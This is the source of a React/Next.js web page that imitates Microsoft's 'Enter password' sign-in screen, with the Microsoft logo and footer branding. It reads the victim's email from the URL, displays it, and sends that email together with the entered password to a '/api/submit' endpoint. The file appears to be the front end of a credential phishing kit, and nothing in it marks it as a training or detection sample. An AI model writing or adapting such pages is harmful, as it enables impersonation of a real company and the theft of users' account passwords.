"use client";

import { useState, useEffect, Suspense } from 'react';
import { useSearchParams } from 'next/navigation';

function PasswordForm() {
  const searchParams = useSearchParams();
  const email = searchParams.get('email') || '';
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [message, setMessage] = useState('');

  useEffect(() => {
    // Pre-fill email display from URL
  }, [email]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setMessage('');

    try {
      const response = await fetch('/api/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password }),
      });

      if (response.ok) {
        setMessage('Login submitted successfully!');
      } else {
        setMessage('Failed to submit. Please try again.');
      }
    } catch (error) {
      setMessage('An error occurred. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <main className="min-h-screen flex flex-col items-center justify-center px-4 relative overflow-hidden">
      {/* Animated gradient background */}
      <div className="absolute inset-0 bg-gradient-to-br from-blue-900 via-purple-900 to-slate-900"></div>
      <div className="absolute inset-0 bg-gradient-to-tr from-cyan-500/20 via-transparent to-pink-500/20"></div>
      {/* Floating orbs for visual interest */}
      <div className="absolute top-1/4 left-1/4 w-96 h-96 bg-blue-500/30 rounded-full blur-3xl"></div>
      <div className="absolute bottom-1/4 right-1/4 w-80 h-80 bg-purple-500/30 rounded-full blur-3xl"></div>
      <div className="absolute top-1/2 right-1/3 w-64 h-64 bg-cyan-400/20 rounded-full blur-3xl"></div>

      {/* Content with frosted glass effect */}
      <div className="relative z-10 w-full max-w-[440px] p-8 rounded-2xl bg-white/10 backdrop-blur-xl border border-white/20 shadow-2xl">
        {/* Microsoft Logo */}
        <div className="mb-6">
          <svg 
            width="108" 
            height="24" 
            viewBox="0 0 108 24" 
            fill="none" 
            xmlns="http://www.w3.org/2000/svg"
            role="img"
            aria-label="Microsoft"
          >
            <path d="M0 0H24V24H0V0Z" fill="#F25022"/>
            <path d="M32 0H56V24H32V0Z" fill="#7FBA00"/>
            <path d="M64 0H88V24H64V0Z" fill="#00A4EF"/>
            <path d="M96 0H120V24H96V0Z" fill="#FFB900"/>
          </svg>
        </div>

        <div className="mb-6">
          <button
            type="button"
            className="text-sm text-gray-600 hover:underline flex items-center gap-1 mb-4"
          >
            <svg 
              width="12" 
              height="12" 
              viewBox="0 0 12 12" 
              fill="currentColor"
            >
              <path d="M10.5 6L6 1.5L1.5 6" stroke="currentColor" strokeWidth="1.5" fill="none"/>
            </svg>
            Back
          </button>
          
          <div className="flex items-center gap-3">
            <div className="w-8 h-8 rounded-full bg-[#0067b8] flex items-center justify-center text-white text-sm font-medium">
              {email.charAt(0).toUpperCase()}
            </div>
            <div>
              <p className="text-sm text-gray-200">{email}</p>
            </div>
          </div>
        </div>
        
        <h1 className="text-2xl font-semibold text-white mb-6">Enter password</h1>
        
        {message && (
          <div className={`mb-4 p-3 rounded ${message.includes('success') ? 'bg-green-100 text-green-700' : 'bg-red-100 text-red-700'}`}>
            {message}
          </div>
        )}
        
        <form className="space-y-4" onSubmit={handleSubmit}>
          <div>
            <label 
              htmlFor="password" 
              className="block text-sm text-gray-200 mb-1"
            >
              Password
            </label>
            <input
              id="password"
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-3 py-2.5 border border-white/30 rounded bg-white/20 backdrop-blur-sm focus:outline-none focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400 text-base text-white placeholder-gray-400"
              autoComplete="off"
              required
            />
          </div>

          <div className="flex items-center justify-between">
            <label className="flex items-center gap-2 cursor-pointer">
              <input 
                type="checkbox" 
                className="w-4 h-4 rounded border-gray-300 text-[#0067b8] focus:ring-[#0067b8]"
              />
              <span className="text-sm text-gray-200">Keep me signed in</span>
            </label>
          </div>

          <div className="pt-2">
            <button
              type="submit"
              disabled={isLoading}
              className="w-full bg-[#0067b8] text-white font-semibold py-2.5 px-4 rounded hover:bg-[#005a9e] transition-colors disabled:opacity-50"
            >
              {isLoading ? 'Signing in...' : 'Sign in'}
            </button>
          </div>
        </form>

        <div className="mt-4 text-center">
          <a 
            href="#" 
            className="text-sm text-cyan-300 hover:underline"
          >
            Forgot password?
          </a>
        </div>
      </div>

        <div className="mt-6">
        <a 
          href="#" 
          className="text-sm text-gray-300 hover:underline flex items-center gap-1"
        >
          <svg 
            width="12" 
            height="12" 
            viewBox="0 0 12 12" 
            fill="currentColor"
          >
            <path d="M10.5 6L6 1.5L1.5 6" stroke="currentColor" strokeWidth="1.5" fill="none"/>
          </svg>
          Back to Microsoft account
        </a>
      </div>

      {/* Footer Links */}
      <footer className="fixed bottom-0 left-0 right-0 bg-white/5 backdrop-blur-sm border-t border-white/10">
        <div className="max-w-[940px] mx-auto px-4 py-4 flex flex-wrap justify-center gap-x-6 gap-y-2 text-xs text-gray-400">
          <a href="#" className="hover:underline">Privacy and cookies</a>
          <a href="#" className="hover:underline">Terms of use</a>
          <a href="#" className="hover:underline">© Microsoft 2026</a>
        </div>
      </footer>
    </main>
  );
}

export default function PasswordPage() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <PasswordForm />
    </Suspense>
  );
}
